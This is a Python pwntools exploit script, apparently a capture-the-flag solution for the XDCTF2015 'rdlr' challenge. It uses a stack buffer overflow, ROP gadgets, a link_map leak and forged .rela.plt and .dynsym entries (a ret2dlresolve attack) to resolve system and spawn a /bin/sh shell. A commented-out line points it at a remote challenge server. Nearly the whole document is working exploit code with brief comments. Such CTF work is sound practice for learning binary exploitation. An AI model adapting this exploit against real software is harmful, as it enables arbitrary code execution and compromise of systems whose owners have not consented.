#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write or puts is called, since need to leak got+8 to print out link_map_addr.
# 2. NO need to have libc!
# 3. need to compile with -no-pie, since need to find gadget
# 4. depends on how many single pop|ret gadget could be found, normally only rdi, rsi could be found

# Refer to http://www.freebuf.com/articles/system/149364.html, need to set link_map_addr + 0x1c8 = 0 to bypass r_info check
from pwn import *
context.log_level = 'debug'
#context(os='linux', arch='amd64', log_level='debug')

p = process('ret2dlresolve/rdlr')
#p = remote('pwn2.jarvisoj.com',9881)

elf = ELF('ret2dlresolve/rdlr')

read_plt = elf.plt['read']
print 'read_plt= ' + hex(read_plt)
bss_addr = elf.bss()
print "bss_addr=" + hex(bss_addr)
start_addr = elf.start # it would fail if using elf.symbols['main']
print 'start_addr= ' + hex(start_addr)

offset = 120 #return by pattern.py
junk = 0

#0x0000000000400793 : pop rdi ; ret
pop_rdi_ret = 0x0000000000400793
#0x0000000000400791 : pop rsi ; pop r15 ; ret
pop_rsi_pop_r15_ret = 0x0000000000400791
def setStack(fun_addr, *args):
  payload = p64(pop_rdi_ret) + p64(args[0])
  if len(args) >= 2:
    payload += p64(pop_rsi_pop_r15_ret) + p64(args[1]) + p64(junk)
  payload += p64(fun_addr)
  return payload
#  40065c:	c9                   	leaveq
#  40065d:	c3                   	retq
leave_ret = 0x40065c

stack_size = 0x800
fake_stack = bss_addr + stack_size
print "fake_stack=" + hex(fake_stack)

p.recvuntil('Welcome to XDCTF2015~!\n')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

payload1 = 'a' * (offset - 8)
payload1 += p64(fake_stack) #rbp = fake_stack
write_plt = elf.plt['write']
print 'write_plt= ' + hex(write_plt)
payload1 += setStack(write_plt, 1, getSection('.got.plt') + 8)
payload1 += setStack(read_plt, 0, fake_stack)
payload1 += p64(leave_ret)

p.sendline(payload1)
link_map_addr = u64(p.recv(8))
print 'link_map_addr= ' + hex(link_map_addr)

sizeof_entry = 8 * 3 # size of rela entry equals dynsym entry
def getFakeAddr(name, base):
  real_addr = getSection(name)
  print "real_addr=" + hex(real_addr)
  fake_addr = base
  mod = (fake_addr - real_addr) % sizeof_entry
  if mod != 0:
    fake_addr += sizeof_entry - mod  # align to size of rela entry
  fake_addr_index = (fake_addr - real_addr) / sizeof_entry
  return (fake_addr, fake_addr_index)


bin_sh = "/bin/sh\0"
bin_sh_offset = 8 * 25
bin_sh_addr = fake_stack + bin_sh_offset
fake_reloc, fake_reloc_index = getFakeAddr('.rela.plt', fake_stack + 8 * 15)
print "fake_reloc=" + hex(fake_reloc) + ", fake_reloc_index=" + hex(fake_reloc_index)
fake_sym, fake_sym_index = getFakeAddr('.dynsym', fake_reloc + sizeof_entry)
print "fake_sym=" + hex(fake_sym) + ", fake_sym_index=" + hex(fake_sym_index)

plt_0 = getSection('.plt')
print "plt_0=" + hex(plt_0)

payload2 = p64(junk)  #next fake stack
payload2 += setStack(read_plt, 0, link_map_addr + 0x1c8) # set link_map_addr + 0x1c8 to 0 bypass r_info check
#0000000000400510 <write@plt>:
#  400510:	ff 25 02 0b 20 00    	jmpq   *0x200b02(%rip)        # 601018 <write@GLIBC_2.2.5>
#  400516:	68 00 00 00 00       	pushq  $0x0
#payload2 += setStack(plt_0, 1, bin_sh_addr) + p64(0) # index for write is 0
#payload2 += setStack(plt_0, 1, bin_sh_addr)
payload2 += setStack(plt_0, bin_sh_addr)
payload2 += p64(fake_reloc_index) # index for fake write rel
payload2 += p64(start_addr)
payload2 += 'a' * (fake_reloc - fake_stack - len(payload2))
payload2 += p64(elf.got['write']) + p64((fake_sym_index << 0x20) | 0x7) + p64(0) #fake reloc
payload2 += 'a' * (fake_sym - fake_stack - len(payload2))
payload2 += p32(fake_sym + sizeof_entry - getSection('.dynstr')) + p32(0x12) #fake_sym
payload2 += p64(0) + p64(0)
#payload2 += 'write\0'
payload2 += 'system\0'
payload2 += 'a' * (bin_sh_offset - len(payload2))
payload2 += bin_sh
p.sendline(payload2)

p.sendline(p64(0))
p.interactive()